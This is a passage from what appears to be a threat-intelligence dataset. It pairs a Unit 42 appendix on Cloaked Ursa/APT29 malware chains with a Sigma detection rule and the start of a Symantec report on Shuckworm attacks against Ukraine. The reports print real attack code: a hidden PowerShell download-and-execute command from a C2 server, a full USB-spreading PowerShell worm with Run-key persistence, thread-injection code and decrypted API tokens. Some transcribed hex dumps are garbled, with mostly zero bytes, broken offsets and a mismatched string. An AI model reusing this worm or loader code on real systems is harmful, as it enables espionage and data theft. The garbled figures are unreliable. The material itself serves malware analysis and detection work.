`Hd0j7avNBxsAAAAAAAAAARq2fs5Ei8Z0-ahPPeB1McEek6NMzkGRmYHuxjsCZTfE`\n\n## Additional Resources\n\n- Espionage Campaign Linked to Russian Intelligence Services – Cybersecurity Emergency Response Team Poland (CERT.PL)\n- Cloaked Ursa / APT29 Phishing Tweet (March 10, 2023) – Palo Alto Networks, Unit 42\n- IOCs: Cloaked Ursa / APT29 Phishing Tweet (March 10, 2023) – Palo Alto Networks, Unit 42\n- Russian APT29 Hackers Use Online Storage Services, DropBox and Google Drive – Palo Alto Networks, Unit 42\n\n## Appendix\n\n### Technical Analysis of BMW Campaign\n\nThe hyperlinks found within the malicious `BMW 5 for sale in Kyiv - 2023.docx` flyers (SHA256: `311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517` and SHA256: `8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596`) lead to a site (`hxxps://resetlocations[.]com/bmw.htm`) that was offline in mid-June, but they originally retrieved a large HTA file (SHA256: `47e8f705febc94c832307dbf3e6d9c65164099230f4d438f7fe4851d701b580b`). This HTA file contains roughly 10 MB of Base64-encoded and XORed data, followed by JavaScript code.\n\nThe JavaScript code would first make a request to the same domain on the URI `kll.php`, before decoding the embedded data mentioned above and triggering the browser to download it using `msSaveOrOpenBlob`, or a mix of `createElement` and `createObjectURL` should `msSaveOrOpenBlob` fail. The downloaded file is assigned the name `bmw.iso` (SHA256: `79a1402bc77aa2702dc5dca660ca0d1bf08a2923e0a1018da70e7d7c31d9417f`), matching the theme seen thus far.\n\nOnce downloaded, execution is reliant on the user clicking the downloaded file, which mounts the disk image to the system and opens up Windows File Explorer. This reveals nine total files masquerading as images, which are instead LNK shortcut files (shown in the execution flow diagram in Figure 3).\n\nA hidden folder named `$Recycle.Bin` is created alongside the LNK files. This folder contains the real PNG images as well as three DLLs, an encrypted payload and a legitimate copy of Microsoft Word named `windoc.exe`.\n\nIf one of the LNK files is clicked, the following command line is executed. Note that the image name is changed depending on the LNK file clicked:\n\n```image\nAlt: Command line of the LNK file\nDescription: The image displays a command line instruction related to the execution of a potentially malicious process. It shows a command that starts a program (`windoc.exe`) located in the `$Recycle.Bin` directory and then attempts to execute a PNG file (`bmw1.png`) from the same directory. The command structure includes `cmd /c start`, which indicates that it is intended to run in the Windows command prompt, suggesting an automated or scripted execution as part of malware behavior.\nTranscription: |\n  cmd /c start .\\$Recycle.Bin\\windoc.exe && .\\$Recycle.Bin\\bmw1.png\n```\n\nWhile `windoc.exe` is not malicious, it does attempt to load several DLLs on runtime and falls victim to DLL hijacking. As a result, it will load two of the three DLLs within its current directory, namely `APPVISVSUBSYSTEMS64.dll` (SHA256: `38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534`) and `MSVCP140.dll` (SHA256: `706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7`). The third DLL (`Mso20Win32Client.dll`) does not appear to be essential to the malware’s functioning and is added so that `windoc.exe` runs correctly, similarly to the DLL described below.\n\n`MSVCP140` is not digitally signed, but does not contain any malicious functionality. It appears to only contain a select few exports from a legitimate copy of `MSVCP140`. It’s likely that this was included to execute `windoc.exe` on systems that did not have Microsoft Visual C++ Redistributables – at least enough so that it would load `APPVISVSUBSYSTEMS64`.\n\n`APPVISVSUBSYSTEMS64`, on the other hand, is a fairly obfuscated DLL. It leverages a large number of unnecessary assembly instructions, including the following, likely hindering decompilation efforts and slowing down analysis:\n\n- `Psllq`\n- `Emms`\n- `Pcmpeqd`\n- `Punpckhbw`\n\n`APPVISVSUBSYSTEMS64` contains a number of anti-analysis techniques, including the following:\n\n- Making sure its process name is set to `windoc.exe`\n- Checking that the system has more than one processor\n- Leveraging `NtQueryObject` to search for any existing `Debug Objects`, to check for the existence of a debugger\n\nIf these checks are all passed, the sample will proceed to open the encrypted payload file found within the ISO file, in this case named `ojg2.px` (SHA256: `c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111`). Once read into memory, it will decrypt the file using an XOR operation, which results in a secondary shellcode layer.\n\nThe shellcode is then injected into the first two active Windows processes that it can inject into, such as `taskhost.exe` or `sihost.exe`, using a technique that is somewhat similar to one previously used by Cloaked Ursa (as recently described by the Military Counterintelligence Service and CERT.PL).\n\nFirst, the shellcode is mapped and copied into the remote process using `NtMapViewOfSection` before a new remote thread is created in a suspended state using `NtCreateThreadEx`. The interesting aspect of this injection technique is that instead of the created thread pointing to the shellcode entry point or any Windows API, it is given a start address of a function within the `APPVISVSUBSYSTEMS64` process. It’s possible that the authors did this to evade monitoring tools from identifying a newly created thread pointing to malicious shellcode.\n\nBefore the thread is resumed with `NtResumeThread`, `APPVISVSUBSYSTEMS64` will use `NtGetContextThread` and `NtSetContextThread` to modify the `RCX` register (which will contain the thread entry) to point to the entry point of the shellcode.\n\n```image\nAlt: Creation of thread pointing to a local function\nDescription: The image depicts a snippet of code related to the process of creating and managing threads in a Windows environment. It includes calls to functions such as `NtCreateThreadEx`, `NtGetContextThread`, and `NtSetContextThread`. The code is likely part of the malware's execution flow, showcasing how the malware handles thread creation and context manipulation to evade detection and facilitate its malicious activities.\nTranscription: |\n  NtCreateThreadEx(\n      (__int64*)&v47,\n      PROCESS_ALL_ACCESS,\n      0i64,\n      (__int64)Handle,\n      (__int64)NtQueryPerformanceCounter, // function to resolve NtQueryPerformanceCounter (in local process)\n      0i64,\n      0i64,\n      0i64,\n      0i64,\n      0i64,\n      0i64);\n  if ( v47 )\n  {\n      Str1.ContextFlags = 0x10000B;\n      if ( (unsigned int)NtGetContextThread((__int64)v47, (__int64)&Str1) )\n      {\n          v30 = 1i64;\n          do\n              --v30;\n          while ( v30 );\n          NtClose(v47);\n          NtClose(Handle);\n          v31 = calloc(3ui64, 2ui64);\n          for ( i = 0i64; i != 3u; ++i )\n              v31[i] ^= 0x72u;\n          free(v31);\n          return 0i64;\n      }\n  }\n  sub_387C93501();\n  Str1.Rcx = shellcodePointer;\n  if ( (unsigned int)NtSetContextThread((__int64)v47, (__int64)&Str1, v33, v34) )\n```\n\nThis results in the resumed thread calling `RtlUserThreadStart`, which will move the value in the `RCX` register to `R9` before calling it, thus triggering the shellcode.\n\nThe goal of the shellcode is to extract the final executable file payload in memory and transfer execution to it. This payload is the final sample in the infection chain and is responsible for handling communication to and from the command and control (C2) server.\n\nThe final payload contains a large array of obfuscation techniques, including string encryption and junk functions, as well as modifying exception handling structures to place “try and except” clauses part way through assembly instructions. This effectively breaks the instructions when disassembling, as many disassemblers will take these structure values into consideration when parsing a binary file. This results in a mangled control flow graph and failed decompilation due to the modifications in the exception handling structures.\n\nFor communication, the payload uses both the Microsoft Graph and Dropbox API. Cloaked Ursa has previously leveraged Dropbox as a C2 server. However, Cloaked Ursa’s use of Microsoft Graph API to facilitate C2 communications appears to be a relatively new addition to their toolkit.\n\nIn addition to the string encrypted tokens and API keys required to communicate with these platforms, there is another string that stands out (shown in Figure 6), used when communicating with the Microsoft Graph API: `Teams_test`.\n\n```image\nAlt: String decryption functions used to decrypt core Dropbox and Microsoft Graph API information\nDescription: The image displays a snippet of code related to a decryption function. It shows multiple calls to a `string_decrypt` function, with parameters that include indices and unknown variables. Each line appears to decrypt specific strings, some of which are noted in the comments, including 'Teams_test' and other obfuscated data. This snippet is relevant to the technical analysis of a malware campaign, illustrating how the malware handles decryption of communication with command and control servers.\nTranscription: |\n  string_decrypt(a1, &unk_140126521, 0x44ui64); // b'840aae0d-cd89-4869-bce1-94222c33035e'\n  string_decrypt(a1 + 32, &unk_140126566, 0x2Aui64); // b'Teams_test'\n  string_decrypt(a1 + 64, &unk_140126591, 0x16Eui64); // b'M.R3_B12.-CYZcTMwdTTD5X91MxE*wscQcrZ5RUoklIvNkUw5pW1kJ9tfqvv1vRT8VgO'\n  string_decrypt(a1 + 96, &unk_140126700, 0x2Fui64); // b'iofd62c8jy9vyp'\n  string_decrypt(a1 + 128, &unk_140126730, 0x2Fui64); // b'sx6qt5wi2t9y7r8'\n  string_decrypt(a1 + 160, &unk_140126760, 0x60ui64); // b'GCy8UdrumsAAAAAAAAASYLcT6_Rjx8PYFAvkH3Q3fT27eYzNsXJYCz7320YBIM'\n```\n\nGiven that the Graph API allows for interacting with a number of different Microsoft 365 Services including Microsoft Teams, it’s possible that this was an initial test for communicating via Teams or the Graph API.\n\nIf communication fails via the Graph API several times, communication via Dropbox is attempted. Several decrypted strings in the binary provide insight into the use of Dropbox for communication.\n\n```image\nAlt: Decrypted strings in the binary that used the Dropbox API\nDescription: The image displays a list of URLs related to the Dropbox API, presenting various endpoints such as those for OAuth token retrieval, file management (create, list, download, and upload), and tagging functionalities. The URLs are formatted in a simple, clear text layout, indicating their purpose in API communication.\nTranscription: |\n  https://api.dropboxapi.com/oauth2/token\n  https://api.dropboxapi.com/2/files/create_folder_v2\n  https://api.dropboxapi.com/2/files/list_folder\n  https://api.dropboxapi.com/2/files/tags/get\n  https://api.dropboxapi.com/2/files/tags/remove\n  https://api.dropboxapi.com/2/files/tags/add\n  https://content.dropboxapi.com/2/files/download\n  https://content.dropboxapi.com/2/files/upload\n```\n\nPreviously, Cloaked Ursa-linked payloads that communicate with Dropbox had wrapped communications in a packet that resembled an MP3 file. The MP3 magic bytes (`ID3\\x04\\x00\\x00\\x00\\x00\\x00#TSSE`) were prepended to the encrypted data and uploaded to Dropbox as an MP3 file.\n\nIn this sample, it appears that they have opted to use BMP files. The threat actor-owned C2 will upload commands to Dropbox that are wrapped in the BMP format. These commands are retrieved by the payload and then parsed, decrypted and executed. Any data that the payload uploads to Dropbox will also be encrypted and wrapped in the BMP format.\n\nIn terms of handled commands, the payload accepts five possible requests from the C2 server, as described in the table below.\n\n| Command Value | Command Description                                       |\n| ------------- | --------------------------------------------------------- |\n| 0             | Inject shellcode into `explorer.exe` or `smartscreen.exe` |\n| 1             | Execute specified command with `CMD.exe`                  |\n| 2             | Read from local file                                      |\n| 3             | Write data to local file                                  |\n| 4             | Spawn and inject code into `WerFault.exe`                 |\n\n*Table 2. Commands handled by sample.*\n\nBased on the lack of additional commands, it’s likely this is merely a loader for a further sample. As of mid-June, the Dropbox and Graph API credentials are no longer valid, preventing access to any information that was uploaded to either platform.\n\n### Technical Analysis of Turkey Campaign\n\nWe identified an additional sample with similar characteristics to other attributed Cloaked Ursa campaigns, which we believe to have been targeting the Turkish Ministry of Foreign Affairs. We did not observe the lure or lures used in this campaign, but we are able to identify the attack chain after the original lure. We assess that the original lure enticed the target to click on `hxxps://simplesalsamix[.]com/e-yazi.html`. The URL is no longer active, but it originally retrieved an HTTP smuggling file named `e-yazi.html` (SHA256: `cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a`).\n\nThe downloaded file is assigned the name `e-yazi.zip` (SHA256: `0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839`). This sample contains five files.\n\nOnce again, a legitimate `WinWord.exe` binary was found within the archive, named `e-yazi.docx.exe`. However, whitespace was added between the `.docx` and `.exe`, resulting in the file appearing as a document file.\n\nAlongside the `WinWord.exe`, a file named `APPVISVSUBSYSTEMS64.dll` (SHA256: `60d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37`) was present once again, as well as a file named `okxi4t.z` (SHA256: `03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48`). This file is similar to the previously mentioned `ojg2.px` in that it contains encrypted shellcode.\n\nOn execution of `WinWord.exe`, `APPVISVSUBSYSTEMS64.dll` is sideloaded and (assuming the standard anti-analysis checks were passed) it would open and read the data from `okxi4t.z` before decrypting it and injecting it into the first running process it can.\n\nThe injected shellcode shares a number of similarities with code seen in the BMW-related sample, such as the following:\n\n- General execution flow\n- Functionality to unhook numerous Windows API calls\n- Its obfuscation techniques\n\nWe were also able to confirm that the shellcode contained overlaps with the fourth-stage shellcode dropper loader, shown in Figure 7, as described in the Cloaked Ursa QUARTERRIG malware report by Military Counterintelligence Service and CERT.PL. The same algorithm and payload structure can be seen within the injected shellcode, as shown in Figure 8, aside from minor differences such as the values of the `magic_const` and `hashed_str`.\n\n```image\nAlt: CERT.PL shellcode structure image\nDescription: The image displays a hex dump from a memory analysis tool or reverse engineering software. It shows hexadecimal values on the left and corresponding ASCII characters on the right. The bookmarks panel on the right highlights various identifiers such as 'hashed_str', 'magic_const', 'key_a', 'data_size', 'key_b', and 'encrypted_data', indicating specific data structures or segments of interest within the hex dump. This type of visualization is commonly used in cybersecurity investigations to analyze encrypted or obfuscated payloads.\nTranscription: |\n  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000C0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000D0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000E0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000000F0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001C0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001D0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001E0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  000001F0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n```\n\n*Figure 7. CERT.PL shellcode structure image. (Source: Figure 10 of the QUARTERRIG Malware Analysis Report, 2023)*\n\n```image\nAlt: Extracted shellcode blob\nDescription: The image displays a hex dump, which is a representation of binary data in hexadecimal format. The left column shows the memory addresses, while the central section reveals the hexadecimal values of the data stored at those addresses. The right side contains the corresponding ASCII representation of the hexadecimal values where applicable. Notably, the string 'WCTNF7RX' is highlighted, indicating a significant piece of data within the dump. This format is commonly used in cybersecurity to analyze malware or reverse-engineer applications by examining the underlying bytecode.\nTranscription: |\n  000006D0  00 00 00 00 00 00 00 00  57 43 54 4E 37 52 58 00  |........WCTNF7X.|\n  000006E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  0000070E  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  0000070F  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000710  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000720  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000730  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000740  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000750  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000760  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000770  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000780  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000790  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007B0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  000007F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000800  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000820  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000840  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n```\n\n*Figure 8. Extracted shellcode blob.*\n\nThe final payload within this infection chain is somewhat similar to the BMW-linked final payload, in that it leverages both Microsoft Graph API and the Dropbox API for C2 communication. Instead of `Teams_test` being the project name, it’s set to `mytestworkapp1`. The hard-coded API tokens are also different from the initially analyzed sample.\n\nSimilar obfuscation was employed within this sample, including string encryption and control flow obfuscation via abusing the exception handling structures. However, there are no junk functions added to the sample, resulting in a much smaller file size of 498 KB.\n\nIt’s worth noting that the string encryption algorithms appear to line up with those seen within the Cloaked Ursa SNOWYAMBER and QUARTERRIG malware reports by the Military Counterintelligence Service and CERT.PL. Many of the string decryption functions leverage inline assembly keys (as seen in Figure 9), while the rest retrieve keys from the `.rdata` directory.\n\n```image\nAlt: First (left) and second (right) string decryption function types\nDescription: The image features two blocks of code, likely representing different functions or sections of code related to string decryption or manipulation. The left block processes an array named 'Str', performing bitwise operations and XOR manipulations on its elements. The right block includes a conditional check on 'Str[15]' and also performs similar bitwise operations and assignments. The use of variables and operations suggests that this code is involved in obfuscation techniques, possibly related to malware analysis, as referenced in the accompanying text.\nTranscription: |\n  v2 = *((_QWORD *)Str + 5);\n  v3 = 0i64;\n  for (i = 0i64; i < 0x25; ++i)\n  {\n      Str[i] ^= v2 >> (8 * ((unsigned __int8)i & 7u));\n  }\n  a2[2] = 0i64;\n  a2[3] = 15i64;\n  *(_BYTE *)a2 = 0;\n  sub_14000BB08(a2, Str);\n  v7 = *((_QWORD *)Str + 5);\n  do\n  {\n      Str[v3] ^= v7 >> (8 * ((unsigned __int8)v3 & 7u));\n      ++v3;\n  } while (v3 < 0x25);\n  \n  if (!Str[15])\n  {\n      do\n      {\n          Str[v2] ^= 0x4F47F16B111DB9C5ui64 >> (8 * ((unsigned __int8)v2 & 7u));\n          ++v2;\n      } while (v2 < 0xF);\n      Str[15] = 1;\n  }\n```\n\n*Figure 9. First (left) and second (right) string decryption function types.*\n\nIt’s clear that Cloaked Ursa remains dedicated to identifying legitimate platforms to host their C2 servers, based on their usage of the Microsoft Graph API within these two samples, as well as past reports describing C2 communication via Notion and Google Drive.",
    "sigma_rule": {
      "title": "Suspicious Process Execution From Fake Recycle.Bin Folder",
      "id": "5ce0f04e-3efc-42af-839d-5b3a543b76c0",
      "related": [
        {
          "id": "cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects process execution from a fake recycle bin folder, often used to avoid security solution.",
      "references": [
        "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
        "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-12",
      "modified": "2023-12-11",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|contains": [
            "RECYCLERS.BIN\\",
            "RECYCLER.BIN\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_recycle_bin_fake_execution.yml",
    "id": "560"
  },
  {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military",
    "markdown": "# Shuckworm: Inside Russia’s Relentless Cyber Campaign Against Ukraine\n\n**Attackers heavily focused on acquiring military and security intelligence in order to support invading forces.**\n\nPosted: 15 Jun, 2023\n\n---\n\nThe Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations.\n\nIn some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more.\n\nIn a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as USB propagation malware.\n\nShuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service (FSB).\n\n## Shuckworm tactics, techniques, and procedures\n\nShuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines and distribute malware. The attackers send emails with malicious attachments to Ukrainian victims, with the attachments of various file types, such as:\n\n- .docx\n- .rar (RAR archive files)\n- .sfx (self-extracting archives)\n- .lnk\n- .hta (HTML smuggling files)\n\nThe victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of children, among others.\n\nOnce victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted machines.\n\nShuckworm has also been observed using a new PowerShell script in order to spread its custom backdoor malware, Pterodo, via USB. Researchers from Symantec, part of Broadcom, blogged about Backdoor.Pterodo in April 2022, documenting how we had found four variants of the backdoor with similar functionality. The variants are Visual Basic Script (VBS) droppers that will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a command-and-control (C&C) server.\n\nExamples of recent scheduled tasks include execution of the following command lines:\n\n- `CSIDL_SYSTEM\\wscript.exe \"CSIDL_PROFILE\\appdata\\local\\temp\\desert\" //e:vbscript //b /dmc /j2k /spl /nff`\n- `CSIDL_SYSTEM\\wscript.exe \"CSIDL_PROFILE\\favorites\\jumper.asf\" //e:vbscript //b /asf /mdf /nab /apk`\n- `wscript.exe \"C:\\Users\\[REDACTED]\\Contacts\\delightful.abk\" //e:vbscript //b /cfg /mdm /cfm /mp4`\n\nThe new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using an `rtk.lnk` extension. The script uses file names such as “porn_video.rtf.lnk”, “do_not_delete.rtf.lnk” and “evidence.rtf.lnk” in an attempt to entice individuals to open the files. These file names are generally in Ukrainian, but some are also in English.\n\nNext, the script enumerates all drives, copying itself to any available removable disks – USB drives. These USB drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizations.\n\nIn this recent activity, we also observed the group leveraging legitimate services to act as C&C servers, including using the Telegram messaging service for its C&C infrastructure. More recently, they have also used Telegram’s micro-blogging platform, called Telegraph, to store C&C addresses.\n\n```image\nAlt: Figure 1. Threat actors use Telegraph to store C&C addresses\nDescription: The image displays a webpage from the Telegraph platform, showing a post with a unique identifier '3igcvo9q4e', dated April 07, 2023. The content of the post includes a single line displaying an IP address, '165.232.165.42', which is likely related to the command-and-control (C&C) infrastructure utilized by the Shuckworm group in their cyber attacks.\nTranscription: |\n  3igcvo9q4e\n  April 07, 2023\n  *165.232.165.42*\n```\n\nShuckworm tends to only use its C&C infrastructure for short periods of time, limiting the usefulness of its C&Cs when it comes to finding more activity or linking activity together. However, the group does use SSL certificates that have some commonalities that may be leveraged for tracking purposes. We believe the group is likely leveraging pre-configured images for use in its C&C deployment. These data points can help researchers to identify additional C&C infrastructure and Shuckworm activity.\n\nSymantec also saw what was likely Giddome, an infostealer tool that is a known Shuckworm backdoor, deployed onto victim networks to steal and exfiltrate data of interest.\n\n## Typical Attack Chain\n\nThe following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaign.\n\nIn one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious document.\n\nAfter the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers’ C&C server:\n\n```\n\"CSIDL_SYSTEM\\cmd.exe\" /c start /min \"\" powershell -w hidden \"$gt='/get.'+char+char+char;$hosta=char;[system.net.servicepointmanager]::servercertificatevalidationcallback={$true};$hosta+='.vafikgo.';$hosta+=char;$hosta+=char;$addrs=[system.net.dns]::gethostbyname($hosta);$addr=$addrs.addresslist[0];$client=(new-object net.webclient);$faddr='htt'+'ps://'+$addr+$gt;$text=$client.downloadstring($faddr);iex $text\"\n```\n\nMore recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers.\n\nShuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April 2023.\n\nNext, a VBS script, which was Shuckworm’s Pterodo backdoor, was executed:\n\n- `CSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\deprive.wow //e:vbscript //b /kmc /fff /cfm /sc4model`\n\nFollowing this, we saw what appeared to be multiple similar scripts being executed. The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departments.\n\nOn a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key e.g. \"usb-накопитель\" translates as \"usb-drive\".\n\nThe foto.safe file is a Base64-encoded script.\n\nDecoded it looks like the following:\n\n```\nfUNCtIon sET-lnK ($chILd) {\n$nAMetxt = \"foto.sAfe\".TolowER();\n$NAmE = (\"кОМПРОМат\", \"КОРЗiНА\", \"СеКРетнО\" | GeT-rAnDOm).ToUPPeR();\n$WSHSHELl = NEw-obJeCT -CoMObjeCT WSCriPT.shELL;\n$sHORTcut = $wShShEll.CREatesHoRTCUt($cHild +\"\\$nAMe.LNK\");\n$shoRtCuT.iConloCaTiON = \"C:\\wiNDoWS\\SysteM32\\SHELL32.DLL,3\";\n$SHOrTcUT.TArGetpAth = \"c:\\wInDOwS\\sYstEm32\\WInDOwSpowERshell\\V1.0\\POwERShEll.ExE\".ToLoweR();\n$text = \"-wInDoWsTYlE hidDeN -nolOgo Iex (IeX (GeT-cOnTent .\\$NAMetxt | OUT-STrIng))\".TOlower();\n$sHORTCUT.ArGUMEnTs = $tExt;\n$sHortCUT.saVE();\n$mYfIlE= $chIlD+\"\\$naMeTXT\"\ncOPY-Item $enV:UsErprOfilE\\iNdEx.phP -deSTINAtION $mYfILE\n$FIlE=GEt-ITEM $mYfiLE -forCe\n$FiLe.ATtRiButes='hiDDEN'\n}\nSet-ITemPRoPERTY -pAth HkCU:\\soFTWare\\MicROsOfT\\WiNDows\\cURRENtVerSiON\\ruN -NAME safE -valUE $env:windir'\\sYSTeM32\\wINDoWSPowErSHEll\\v1.0\\pOwERShell.eXE -WIndowSTYlE hiddEN -noLOgO inVOkE-ExpREsSIOn (get-contEnT $eNV:usERPRoFILe\\INdEX.PHp | Out-sTRing) | poweRSHeLL -noPROfILE';\ncoPy-item  .\\\"fOtO.safe\"  -dEsTInaTioN $Env:USeRprOFIle\\iNdEX.pHp\nWHile($CoUNT -lE 2){\n$urLs = 'hTTP://'+ [SYSTEM.NEt.DnS]::geThostadDREsSes([String]$(GEt-random)+'.cOriDAS.Ru') +'/slEEP.Php';\niEX $(New-ObJeCt Net.WEBClient).uPloAdStRING($uRls.ToloWER(),'')\n$drIVE = GeT-wmIoBJeCt WIN32_VOluME -fILTer \"drIvETYPe='2'\";\n$Drive.naMe | FOreaCH-oBJecT{\n$CHiLdS = GET-ChilDITem $drivE.nAMe\nfoReach($cHilDs IN $chiLDs)\n{\nif( [SYsTEM.io.fiLE]::GetAttributES($ChilDS.FuLlnAMe) -eq [SYsTEM.Io.fILeaTTrIbuTES]::DIRecToRy )\n{\nsET-lnk $chILds.fUlLName\n}}\nIF(($dRIVe.CapaCITY - $DriVe.fREeSPACE) -Gt 1000000){\nSEt-lNK $DRivE.name\n}}\nSTArt-SLEeP -S 300;\n}\n```\n\nThis PowerShell script is used to copy itself onto the infected machine and then create a shortcut file that links to the PowerShell script. Symantec has identified multiple variants of this script that can be used to indicate successful infection, or to download additional tools onto infected machines.\n\n## Victims\n\nOne of the most significant things about this campaign is the targets, which include Ukrainian military, security, research, and government organizations. The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts.\n\nThe majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of the victim machines until May. The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about 